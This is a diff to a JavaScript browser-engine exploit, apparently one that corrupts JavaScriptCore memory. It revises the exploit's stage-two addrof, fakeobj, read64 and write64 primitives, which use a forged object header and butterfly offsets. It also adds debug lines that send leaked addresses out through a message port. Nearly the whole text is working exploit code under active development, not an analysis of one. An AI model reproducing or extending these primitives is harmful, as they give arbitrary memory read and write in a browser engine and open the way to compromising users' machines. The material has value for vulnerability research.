@@ -139,19 +139,17 @@ for (var i = 0; i < 1000; ++i) {
     outer.header = qwordAsTagged(0x0108230700000000);
 
     var stage2 = {
-        addrof: function(victim) {
-            boxed1[0] = victim;
-            return floatAsQword(unboxed1[0]);
+        addrof: function(obj) {
+            return addrof(obj)
         },
 
         fakeobj: function(addr) {
-            unboxed1[0] = qwordAsFloat(addr);
-            return boxed1[0];
+            return fakeobj(addr)
         },
 
         write64: function(where, what) {
             hax[1] = qwordAsFloat(where + 0x10);
-            victim1.prop = this.fakeobj(qwordAsTagged(what));
+            victim1.prop = this.fakeobj(qwordAsFloat(what));
         },
 
         read64: function(where) {
@@ -162,12 +160,14 @@ for (var i = 0; i < 1000; ++i) {
         test: function() {
             var addr = this.addrof({a: 0x1337});
             var x = this.fakeobj(addr);
-            if (x.a != 0x1337) {
+            port.postMessage(hex1(x.a))
+            if (hex1(x.a) != 0x1337) {
                 print('stage2 addrof/fakeobj does not work');
             }
 
             var val = 0x42424242;
-            this.write64(shared_butterfly + 8, 0x42424242);
+            this.write64(0x4141414141,0x999999999)
+            this.write64(shared_butterfly - 8, 0x42424242);
             print(hex1(floatAsQword(unboxed1[1])))
             if (qwordAsFloat(val) != unboxed1[1]) {
                 print('stage2 write does not work');
@@ -189,6 +189,17 @@ for (var i = 0; i < 1000; ++i) {
     };
 
     stage2.test();
+    var v = 0x4141;
+            var obj = {p: v};
+
+            var addr = addrof(obj);
+            port.postMessage("addr deb" + hex1(addr))
+            //port.postMessage(fakeobj(addr).p);
+
+            //var propertyAddr = addr + 0x10;
+
+            //var value = stage2.read64(propertyAddr);
+            //port.postMessage("value" + hex1(value))
 
 
         /*var addr1 = addrof({a:0x1337});
